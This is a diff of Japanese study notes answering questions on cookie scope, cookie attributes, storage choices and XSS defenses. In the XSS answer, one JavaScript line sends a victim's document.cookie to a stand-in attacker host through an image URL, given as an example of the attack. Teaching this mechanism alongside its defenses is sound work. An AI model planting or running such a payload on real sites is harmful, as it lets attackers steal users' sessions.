@@ -147,52 +147,75 @@ Cookieの仕様がまとめられている[RFC6265](https://tools.ietf.org/html/
 
 ## 課題1
 
-### `www.hoge.com`で発行されたクッキーは`www.fuga.com`にも送信されるのか
+### 質問2: `www.hoge.com`で発行されたクッキーは`www.fuga.com`にも送信されるのか
 
 - 送信されない
+  - 同一オリジンではないため
   - `same-site`の考えに基づくとこの2つのサイトは`cross-site`となる
     - `www.hoge.com`: `.hoge.com`
     - `www.fuga.com`: `.fuga.com`
 
-### `hoge.com:8080`で発行されたクッキーは`hoge.com:9090`に送信されるのか
+### 質問3: `hoge.com:8080`で発行されたクッキーは`hoge.com:9090`に送信されるのか
 
 - 送信される
   - SOP境界とは異なり`same-site`ではポート番号を含めない
     - `hoge.com:8080`: `hoge.com`
     - `hoge.com:9090`: `hoge.com`
 
-### `www.hoge.com`で発行されたクッキーは`www.api.hoge.com`にも送信されるのか
+参考資料
 
-- 送信される
-  - `same-site`の考えに基づくとこの2つのサイトは`same-site`となる
-    - `www.hoge.com`: `.hoge.com`
-    - `www.api.hoge.com`: `.hoge.com`
+- [RFC 6265, HTTP State Management Mechanism 8.5. 機密性の弱点](https://triple-underscore.github.io/http-cookie-ja.html#weak-confidentiality)
 
-### `Set-Cookie: Domain=hoge.com`を設定した場合に`api.hoge.com`にもクッキーは送信されるのか
+### 質問4: `www.hoge.com`で発行されたクッキーは`www.api.hoge.com`にも送信されるのか
+
+- 条件によって異なる
+  - 送信される場合
+    - クッキーの `Domain` 属性に対して、明示的に `hoge.com` が指定されている場合、そのサブドメインに対してもクッキーが送信される
+  - 送信されない場合
+    - クッキーの `Domain` 属性に何も指定されていない場合、サブドメインにはクッキーは送信されない
+    - セキュリティのためには、この属性には何も設定しないほうがいい
+
+参考資料
+
+- [RFC 6265, HTTP State Management Mechanism 4.1.2.3. The Domain Attribute](https://tools.ietf.org/html/rfc6265#section-4.1.2.3)
+
+### 質問5: `Set-Cookie: Domain=hoge.com`を設定した場合に`api.hoge.com`にもクッキーは送信されるのか
 
 - 送信される
   - `Domain`を設定した場合、すべてのサブドメインに対してCookieは送信されるため
 
-### ブラウザからクッキーの値が取得できないようにすることは可能なのか
+参考資料
+
+- [Cookieの送信先の定義](https://developer.mozilla.org/ja/docs/Web/HTTP/Cookies#define_where_cookies_are_sent)
+
+### 質問6: ブラウザからクッキーの値が取得できないようにすることは可能なのか
 
 - 可能
-  - ブラウザから`document.cookie`を使用することでCookieの値を設定することが可能である
+  - クッキーの属性に何も設定していない場合、ブラウザから`document.cookie`を使用することでCookieの値を設定することが可能である
   - これはセッション固定化攻撃にも使われる
-  - ただしCookieに`HttpOnly`を設定すれば、HTTPヘッダによる変更しかできなくなる
+  - ただしCookieに `HttpOnly` 属性を設定すれば、HTTPヘッダによる変更しかできなくなる
 
-### HTTPS通信の場合だけクッキーを送信することはできるのか
+参考資料
+
+- [RFC 6265, HTTP State Management Mechanism 4.1.2.6. HttpOnly 属性（非公式日本語訳）](https://triple-underscore.github.io/http-cookie-ja.html#sane-httponly)
+
+### 質問7: HTTPS通信の場合だけクッキーを送信することはできるのか
 
 - 可能
   - Cookieに`Secure`を設定すればHTTPS通信の場合にのみCookieが送信される
-  - 細心のブラウザだと`http:`のサイトでは`Secure`はもう使用できない
+  - 最新のブラウザだと`http:`のサイトでは`Secure`はもう使用できない
 
-### クッキーに`Expires`を設定した場合の挙動はどうなるでしょうか
+### 質問8: クッキーに`Expires`を設定した場合の挙動はどうなるでしょうか
 
 - Cookieに有効期限がつく
   - `Expires`にHTTPの日時（`Date`）を設定する
   - ブラウザは設定されている日時に達していない場合にのみCookieをサーバに送信する
 
-### `SameSite`を設定した場合の挙動はどうなるでしょうか
+参考資料
+
+- [RFC 6265, HTTP State Management Mechanism 5.2.1. The Expires Attribute](https://tools.ietf.org/html/rfc6265#section-5.2.1)
+
+### 質問9: `SameSite`を設定した場合の挙動はどうなるでしょうか
 
 - 指定した値によって挙動は異なる
   - `Strict`
@@ -203,23 +226,51 @@ Cookieの仕様がまとめられている[RFC6265](https://tools.ietf.org/html/
   - `None`
     - 制限なくCookieが送信される
 
-### クッキーに格納してはいけない情報として3つ例をあげてみましょう
+参考資料
 
-- Cookieの値自体が暗号化されているわけではないため、盗まれることを考慮して機密情報は含めないようにする
-  - パスワード
-  - クレジットカード情報
+- [SameSite cookies](https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
 
-### クッキーとローカルストレージはどのように使い分ければいいでしょうか
+### 質問10: クッキーに格納してはいけない情報として3つ例をあげてみましょう
 
-- データを誰が使うのかが異なる
-  - `Cookie`: サーバ側が使用する
-  - `localStorage`: クライアント側が使用する
+- 徳丸さんの[「体系的に学ぶ 安全なWebアプリケーションの作り方」](https://www.amazon.co.jp/%E4%BD%93%E7%B3%BB%E7%9A%84%E3%81%AB%E5%AD%A6%E3%81%B6-%E5%AE%89%E5%85%A8%E3%81%AAWeb%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E4%BD%9C%E3%82%8A%E6%96%B9-%E7%AC%AC2%E7%89%88%EF%BC%BB%E5%9B%BA%E5%AE%9A%E7%89%88%EF%BC%BD-%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%8C%E7%94%9F%E3%81%BE%E3%82%8C%E3%82%8B%E5%8E%9F%E7%90%86%E3%81%A8%E5%AF%BE%E7%AD%96%E3%81%AE%E5%AE%9F%E8%B7%B5-%E5%BE%B3%E4%B8%B8-%E6%B5%A9-ebook/dp/B07DVY4H3M/ref=sr_1_2?__mk_ja_JP=%E3%82%AB%E3%82%BF%E3%82%AB%E3%83%8A&crid=1TIN7S41J6LSE&dchild=1&keywords=%E4%BD%93%E7%B3%BB%E7%9A%84%E3%81%AB%E5%AD%A6%E3%81%B6%E5%AE%89%E5%85%A8%E3%81%AA&qid=1616329008&sprefix=jabra%2Caps%2C327&sr=8-2) によれば、セッションIDとトークン以外の情報をクッキーに保存することは推奨されていない
+- 当然以下のような情報もクッキーには保存してはいけない
+  - ユーザーのパスワード
+  - クレジット情報
+  - 権限情報
+- またセッションIDを登録する際にも、攻撃者に推測されやすいIDはセッションの推測による攻撃を受けるため、推奨されていない
+  - 日時情報を含めていたりなど
 
-### Web掲示板サービス開発している際に、XSSにより他ユーザのクッキー情報が抜き出される仕組みとその対策はどのようなものでしょうか
+参考資料
+
+- [RFC 6265, HTTP State Management Mechanism 8. セキュリティの考慮点（非公式日本語訳）](https://triple-underscore.github.io/http-cookie-ja.html#security-considerations)
+- [IPA 安全なウェブサイトの作り方 - 1.4 セッション管理の不備](https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_4.html)
+
+### 質問11: クッキーとローカルストレージはどのように使い分ければいいでしょうか
+
+![](https://miro.medium.com/max/875/1*O70Ml_4EqDa7i3uV0dlK1A.png)
+
+> [Browser storage: Local Storage, Session Storage, Cookie, IndexedDB and WebSQL](https://medium.com/@lancelyao/browser-storage-local-storage-session-storage-cookie-indexeddb-and-websql-be6721ebe32a)
+
+
+- Cookie
+  - 有効期限を設定したい
+  - サーバ側にデータを送信したい
+  - HTML4に対応させたい
+- localStorage
+  - 半永久的にデータを保存したい
+  - 大容量のデータを保存したい
+
+参考資料
+
+- [CookieとWebStorageとSessionについてのまとめ](https://qiita.com/pipiox/items/95554673ba3b078ac112)
+- [JavaScript Cookies vs Local Storage vs Session](https://www.youtube.com/watch?v=GihQAC1I39Q)
+
+### 質問12: Web掲示板サービス開発している際に、XSSにより他ユーザのクッキー情報が抜き出される仕組みとその対策はどのようなものでしょうか
 
 - XSSの仕組み
   - 掲示板に投稿する内容にスクリプトを仕組む
   - その際に、自身のサイトにアクセスするように誘導する
+  
     ```js
     document.write("<img src='http://evel.example.com/sample.png?" + document.cookie + "'>")
     ```
@@ -227,10 +278,16 @@ Cookieの仕様がまとめられている[RFC6265](https://tools.ietf.org/html/
   - こうすることで被害者が上記のリンクを踏んだ際に、被害者のCookieの値を盗むことができる
 
 - 防ぐ方法
-  - 通信経路の盗聴
-    - `Secure`を設定する
-  - JavaScriptによるアクセス
-    - `HttpOnly`を設定する
+  - 通信経路の盗聴に対する防護
+    - クッキー属性に `Secure` を設定する
+  - JavaScriptによるアクセスに対する防護
+    - クッキー属性に `HttpOnly` を設定する
+
+上記のようにクッキーに対してセキュリティに関する属性を追加する以外にも、`X-XSS-Protection` や `Content-Security-Policy` などのHTTPヘッダを設定するといった対策が存在している。
+
+参考資料
+
+- [安全なウェブサイトの作り方 - 1.5 クロスサイト・スクリプティング](https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_5.html)
 
 ## 参考資料
 
